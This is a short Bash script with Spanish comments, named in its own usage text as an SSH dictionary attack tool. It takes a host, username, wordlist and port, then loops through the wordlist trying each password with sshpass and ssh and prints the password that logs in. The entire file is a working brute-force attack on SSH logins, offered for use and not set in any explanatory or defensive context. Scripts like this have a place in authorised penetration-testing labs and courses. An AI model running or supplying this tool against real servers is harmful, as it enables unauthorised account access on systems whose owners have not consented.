#! /bin/bash

#Variables para cada uno de los argumantos
dominio_o_ip=$1
nombre_usuario=$2
diccionario=$3
puerto=$4

#Funcion que sirve para poder usar Ctrl+C 
ctrl_c() {
    echo "(Ctrl+C). Saliendo del script..."
    exit 1
}

# Asigna la función ctrl_c al manejo de la señal SIGINT (Ctrl+C)
trap ctrl_c SIGINT

#Funcion que nos dice como se usa la herramienta
uso_herramienta(){
    echo "Este script se utiliza para atacar un servidor ssh con un diccionario"
    echo "El script se utiliza de la siguiente manera"
    echo "ataque_diccionario_ssh.sh [nombre de dominio o direccion IP] [nombre de usuario] [diccionario] [puerto]"

}

#Funcion que realiza un ataque por ssh usando un diccionario
ataque_diccionario(){
    if [ -z $1 ] || [ -z $2 ] || [ -z $3 ] || [ -z $4 ]; then
        echo "Faltan argumentos"
        uso_herramienta
        exit 1
    elif [ -f $3 ]; then
        for password in $(cat $3); do
            echo "Probando con $password"
            sshpass -p $password ssh $2@$1 -p $4 ps -eaf > /dev/null 
            if [ $? -eq 0 ]; then
                echo "La contraseña es $password"
                exit 0
            fi
        done
        echo "No se encontro la contraseña"
        exit 1

    else
        echo "El diccionario no existe"
        exit 1

    fi
}

#Llamada a la funcion
ataque_diccionario "$dominio_o_ip" "$nombre_usuario" "$diccionario" "$puerto"

